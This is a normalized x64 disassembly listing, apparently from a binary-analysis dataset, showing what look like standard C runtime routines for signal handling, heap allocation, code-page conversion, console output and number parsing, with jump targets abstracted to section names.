sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_140008b40
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_140008b70
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_140008c30
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov ebx ecx
xor edi edi
mov [ rsp + 0x70 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_1400036cc
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_140004df8
int3
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ rw-data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_140006990
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
call DecodePointer
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x38 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x70 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ rw-data ]
mov edx ecx
mov [ rsp + 0x30 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x38 ]
mov r14d [ rsp + 0x70 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
cmp edx 0x1
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_140006890
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x30 ] edx
mov ecx [ rw-data ]
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x16
and [ rsp + 0x20 ] rsi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ rw-data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
xor eax eax
mov [ rsi + 0xb0 ] r14d
cmp ebx 0x4
jne r-xdata
sub_140008efc
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140008f30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
mov ebp r8d
mov r13 rdx
mov r14 rcx
call EncodePointer
xor ebx ebx
mov rdi rax
cmp [ rw-data ] rbx
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
call DecodePointer
test rax rax
je r-xdata
mov rcx rax
call DecodePointer
mov rcx [ rw-data ]
mov rsi rax
call DecodePointer
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call __imp_EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r13
mov rdx r14
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x88 ]
mov r9d 0xc
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x38 ] 0x1
jne r-xdata
sub_140009124
sub rsp 0x38
test ecx ecx
js r-xdata
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x38
retn
mov eax [ rw-data ]
jmp r-xdata
sub_1400091f4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
xor edi edi
cmp rcx rdi
je r-xdata
call sub_140003b30
mov ebx 0x16
cmp rdx rdi
jbe r-xdata
cmp r8 rdi
jne r-xdata
mov r9 rcx
mov [ rcx ] di
cmp rdx rdi
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] di
call sub_140003b30
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
add r8 0x2
mov [ r9 ] ax
add r9 0x2
cmp ax di
je r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
mov [ rax ] ebx
call sub_140003a60
mov eax ebx
sub_140009294
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x28 ] rax
lea r8 [ rsp + 0x20 ]
mov r9d 0x6
mov edx 0x1004
mov [ rsp + 0x26 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea rcx [ rsp + 0x20 ]
call sub_1400097b4
or eax 0xffffffff
jmp r-xdata
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_140002370
add rsp 0x38
retn
sub_1400092e8
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
lea rbp [ rsp + 0x40 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x30 ] rax
mov r14 [ rbp + 0xb0 ]
mov r12d [ r9 ]
xor edi edi
mov rbx r8
mov rsi rdi
mov [ rbp ] edi
mov [ rbp + 0x10 ] r9
mov r13d edx
mov r15d ecx
mov [ rbp + 0x8 ] rbx
cmp ecx edx
je r-xdata
mov rax rsi
lea rdx [ rbp + 0x18 ]
call [ GetCPInfo@IAT ]
cmp eax edi
je r-xdata
mov r9d r12d
mov r8 rbx
mov edx 0x1
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
mov edi eax
test eax eax
jne r-xdata
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
test edi edi
jle r-xdata
xor eax eax
jmp r-xdata
lea rdx [ rbp + 0x18 ]
mov ecx r13d
call [ GetCPInfo@IAT ]
cmp eax edi
je r-xdata
xor ebx ebx
movsxd rcx edi
mov rax 0x7ffffffffffffff0
cmp rcx rax
ja r-xdata
mov rcx [ rbp + 0x30 ]
xor rcx rbp
call sub_140002370
lea rsp [ rbp + 0x48 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
movsxd r8 edi
xor edx edx
mov rcx rbx
add r8 r8
call sub_140005d40
mov r8 [ rbp + 0x8 ]
mov r9d r12d
mov edx 0x1
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
xor r15d r15d
cmp eax r15d
je r-xdata
lea rcx [ rcx + rcx + 0x10 ]
cmp rcx 0x400
ja r-xdata
mov [ rbp ] 0x1
cmp r12d 0xffffffff
je r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
cmp r14 r15
je r-xdata
call sub_140009570
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov rcx rbx
call sub_140007450
lea edi [ rax + 0x1 ]
jmp r-xdata
mov edi r12d
call sub_1400069d4
cmp [ rbp ] r15d
jne r-xdata
mov eax [ rbp + 0xb8 ]
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] eax
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x20 ] r14
call [ WideCharToMultiByte@IAT ]
cmp eax r15d
je r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14000a7a0
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
movsxd rdx edi
mov ecx 0x1
call sub_140006a80
mov rsi rax
cmp rax r15
je r-xdata
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] r15
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp eax r15d
je r-xdata
mov rsi r14
jmp r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp eax r15d
jne r-xdata
add rbx 0x10
jmp r-xdata
cmp r12d 0xffffffff
je r-xdata
mov rcx rsi
call sub_1400069d4
mov rsi r15
jmp r-xdata
mov rcx [ rbp + 0x10 ]
mov [ rcx ] eax
sub_140009570
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_140008efc
call sub_140003b30
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_1400050b4
mov ecx 0x1e
call sub_140004e8c
mov ecx 0xff
call sub_140004b10
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_140003b30
mov [ rax ] 0xc
mov rcx rbx
call sub_140008efc
test eax eax
je r-xdata
call sub_140003b30
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_140009630
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0xc
call sub_140003a60
test rbx rbx
je r-xdata
mov rcx rdi
call sub_140008efc
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_1400096e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_140009570
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_1400069d4
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_140008efc
call sub_140003b30
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_140003b30
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_140003ae8
mov [ rbx ] eax
mov rcx rbx
call sub_140008efc
test eax eax
je r-xdata
call sub_140003b30
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_140003ae8
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_1400097c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov ebx r9d
mov rdi r8
call sub_1400023d8
cmp ebx 0xffffffff
jge r-xdata
mov r9 [ rsp + 0x70 ]
mov r8d ebx
mov rdx rdi
mov ecx esi
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_140009824
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_140003b30
mov [ rax ] 0x9
call sub_140003b50
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
sub ecx 0x1
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_1400098d0
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_140003b50
and [ rax ] 0x0
call sub_140003b30
mov [ rax ] 0x9
jmp r-xdata
call sub_140003b50
and [ rax ] 0x0
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
call sub_140003a60
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x38
retn
sub_140009954
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r13 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r13 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_140006990
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r13
retn
mov rcx [ r13 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_140006890
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call sub_140008ebc
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_140009a24
sub rsp 0x68
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
cmp [ rw-data ] 0x0
mov [ rsp + 0x40 ] cx
je r-xdata
call [ GetConsoleOutputCP@IAT ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx eax
lea rax [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
mov eax 0xffff
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x48 ]
mov r8d eax
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
cmp rcx 0xffffffffffffffff
je r-xdata
call sub_14000a2d4
mov rcx [ rw-data ]
mov ax [ rsp + 0x40 ]
jmp r-xdata
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_140002370
add rsp 0x68
retn
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
and [ rw-data ] 0x0
sub_140009b38
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x50
xor ebp ebp
mov rsi r8
mov rdi rdx
mov rbx rcx
cmp rdx rbp
je r-xdata
xor eax eax
cmp r8 rbp
je r-xdata
cmp [ rdx ] bpl
jne r-xdata
lea rcx [ rsp + 0x30 ]
mov rdx r9
call sub_1400023d8
mov r11 [ rsp + 0x30 ]
cmp [ r11 + 0x14 ] ebp
jne r-xdata
cmp rcx rbp
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_1400076a8
cmp eax ebp
je r-xdata
cmp rbx rbp
je r-xdata
mov [ rcx ] bp
mov eax ebp
mov r9d 0x1
cmp rbx rbp
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebp
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rsp + 0x48 ] bpl
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_140003b30
mov [ rax ] 0x2a
cmp [ rsp + 0x48 ] bpl
je r-xdata
cmp [ rdi + 0x1 ] bpl
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax ebp
cmp rbx rbp
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rsp + 0x30 ]
cmp eax ebp
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_140009cb4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push r12
sub rsp 0x30
xor esi esi
lea ecx [ rsi + 0x1 ]
call sub_140006990
nop
lea ebx [ rsi + 0x3 ]
mov [ rsp + 0x20 ] ebx
mov ecx 0x1
call sub_140006890
mov eax esi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_14000a3d8
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + r12 * 8 ]
call sub_1400069d4
mov r11 [ rw-data ]
and [ r11 + r12 * 8 ] 0x0
inc esi
mov [ rsp + 0x24 ] esi
sub_140009d64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_1400086f0
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_1400082d4
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_140009de0
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_140009d64
test eax eax
je r-xdata
call sub_140009e28
jmp r-xdata
bt [ rbx + 0x18 ] 0xe
jae r-xdata
or eax 0xffffffff
jmp r-xdata
add rsp 0x20
pop rbx
retn
xor eax eax
mov rcx rbx
call sub_1400086f0
mov ecx eax
call sub_14000a450
neg eax
sbb eax eax
jmp r-xdata
sub_140009e28
mov [ rsp + 0x8 ] rsi
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
push r13
push r14
push r15
sub rsp 0x30
mov r14d ecx
xor r12d r12d
xor esi esi
lea ecx [ rsi + 0x1 ]
call sub_140006990
nop
xor edi edi
mov [ rsp + 0x20 ] edi
or r15d 0xffffffff
mov ecx 0x1
call sub_140006890
cmp r14d 0x1
cmove esi r12d
mov eax esi
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov r12 [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r14
pop r13
retn
movsxd r13 edi
mov rax [ rw-data ]
cmp [ rax + r13 * 8 ] 0x0
je r-xdata
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
mov rdx [ rax + r13 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
cmp edi [ rw-data ]
jge r-xdata
mov ecx edi
call sub_140008640
nop
mov rax [ rw-data ]
mov rcx [ rax + r13 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r13 * 8 ]
mov ecx edi
call sub_1400086c8
cmp r14d 0x1
jne r-xdata
test r14d r14d
jne r-xdata
call sub_140009de0
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc r12d
mov [ rsp + 0x24 ] r12d
jmp r-xdata
call sub_140009de0
cmp eax r15d
cmove esi r15d
mov [ rsp + 0x28 ] esi
sub_140009f34
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov r14 rdx
mov rdx rcx
lea rcx [ rax - 0x38 ]
mov r12d r9d
mov r13 r8
call sub_1400023d8
test r13 r13
je r-xdata
test r14 r14
jne r-xdata
mov [ r13 ] r14
test r12d r12d
je r-xdata
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
cmp [ rsp + 0x48 ] 0x0
jmp r-xdata
mov bpl [ r14 ]
mov r8 [ rsp + 0x30 ]
xor edi edi
lea rbx [ r14 + 0x1 ]
cmp r12d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx bpl
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rsp + 0x30 ]
movzx ecx bpl
mov edx 0x8
call sub_140007738
mov r8 [ rsp + 0x30 ]
jmp r-xdata
cmp r12d 0x24
jg r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rsp + 0x90 ]
cmp bpl 0x2d
jne r-xdata
mov bpl [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp bpl 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r12d r12d
js r-xdata
mov bpl [ rbx ]
inc rbx
test r13 r13
je r-xdata
cmp r12d 0x1
je r-xdata
cmp [ rsp + 0x48 ] dil
mov [ r13 ] r14
cmp r12d 0x24
jg r-xdata
test r12d r12d
jne r-xdata
cmp r12d 0x10
jne r-xdata
cmp bpl 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r12d
mov r9d eax
cmp bpl 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
test r8d 0x103
je r-xdata
movsx ecx bpl
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ rbp - 0x61 ]
movsx ecx bpl
cmp al 0x19
ja r-xdata
cmp ecx r12d
jae r-xdata
